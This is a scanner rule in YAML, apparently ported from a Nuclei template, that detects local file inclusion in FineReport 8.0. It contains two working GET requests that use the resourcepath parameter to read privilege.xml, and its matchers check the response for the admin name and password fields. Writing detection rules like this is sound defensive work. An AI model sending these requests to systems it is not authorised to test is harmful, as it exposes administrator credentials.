schema_version: 1
id: "cortex.community:finereport-path-traversal"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "FineReport 8.0 - Local File Inclusion"
  description: "FIneReport 8.0 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://web.archive.org/web/20200506020241/http://foreversong.cn/archives/1378"
  cwes: [22]
  tags: ["finereport", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml" }
  - id: "probe1"
    request: { method: "GET", path: "/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<rootManagerName>" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<rootManagerPassword>" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "<rootManagerName>" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "<rootManagerPassword>" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
